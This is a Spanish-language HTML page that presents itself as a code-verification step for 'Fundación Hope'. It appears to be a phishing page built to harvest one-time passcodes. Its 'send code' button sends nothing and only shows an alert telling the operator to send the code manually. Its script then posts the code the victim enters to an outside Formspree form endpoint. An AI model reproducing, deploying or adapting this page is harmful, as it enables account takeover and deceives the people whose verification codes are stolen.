<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verificación - Fundación Hope</title>
<style>
  /* Reset básico */
  *, *::before, *::after {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #6a11cb, #2575fc);
    color: #333;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }

  .container {
    background: #fff;
    padding: 40px 50px;
    border-radius: 12px;
    box-shadow: 0 8px 30px rgba(0,0,0,0.12);
    width: 100%;
    max-width: 440px;
    text-align: center;
  }

  h1 {
    margin-bottom: 10px;
    font-weight: 700;
    color: #2575fc;
  }

  p.subtitle {
    margin-bottom: 25px;
    color: #666;
    font-size: 1rem;
  }

  button, input[type="submit"] {
    background-color: #2575fc;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 14px 20px;
    font-size: 1.1rem;
    font-weight: 600;
    cursor: pointer;
    width: 100%;
    box-shadow: 0 4px 12px rgba(37,117,252,0.4);
    transition: background-color 0.3s ease;
  }

  button:hover, input[type="submit"]:hover {
    background-color: #1a54c8;
  }

  input[type="text"] {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    border: 2px solid #ddd;
    font-size: 1rem;
    margin-bottom: 20px;
    transition: border-color 0.3s ease;
  }

  input[type="text"]:focus {
    border-color: #2575fc;
    outline: none;
  }

  #mensaje {
    margin-top: 15px;
    font-weight: 600;
    min-height: 26px;
  }

  /* Oculto inicialmente */
  #codigoInput, #btnVerificar {
    display: none;
  }
</style>
</head>
<body>

<div class="container" id="contenedor">
  <h1>Verificación de Código</h1>
  <p class="subtitle">Presiona el botón para enviar el código de verificación a tu teléfono.</p>
  <button id="btnEnviarCodigo">Enviar código de verificación</button>

  <form id="formVerificacion" action="https://formspree.io/f/xgoqzbkg" method="POST">
    <input type="text" id="codigoInput" name="codigo" placeholder="Ingresa el código recibido" maxlength="6" required />
    <input type="submit" id="btnVerificar" value="Verificar Código" />
  </form>

  <p id="mensaje"></p>
</div>

<script>
  const btnEnviarCodigo = document.getElementById('btnEnviarCodigo');
  const codigoInput = document.getElementById('codigoInput');
  const btnVerificar = document.getElementById('btnVerificar');
  const form = document.getElementById('formVerificacion');
  const mensaje = document.getElementById('mensaje');

  btnEnviarCodigo.addEventListener('click', () => {
    alert("Código enviado al teléfono registrado. (Envía el código manualmente)");
    codigoInput.style.display = "block";
    btnVerificar.style.display = "block";
    btnEnviarCodigo.style.display = "none";
  });

  form.addEventListener('submit', function(event) {
    event.preventDefault();

    const formData = new FormData(form);

    fetch(form.action, {
      method: 'POST',
      body: formData,
      headers: { 'Accept': 'application/json' }
    }).then(response => {
      if (response.ok) {
        mensaje.textContent = "Código enviado correctamente. ¡Gracias por verificar!";
        mensaje.style.color = "#27ae60";
        form.style.display = "none";
      } else {
        response.json().then(data => {
          if (data && data.errors) {
            mensaje.textContent = data.errors.map(e => e.message).join(", ");
          } else {
            mensaje.textContent = "Error al enviar el código.";
          }
          mensaje.style.color = "#e74c3c";
        });
      }
    }).catch(() => {
      mensaje.textContent = "Error al enviar el código. Intenta nuevamente.";
      mensaje.style.color = "#e74c3c";
    });
  });
</script>

</body>
</html>
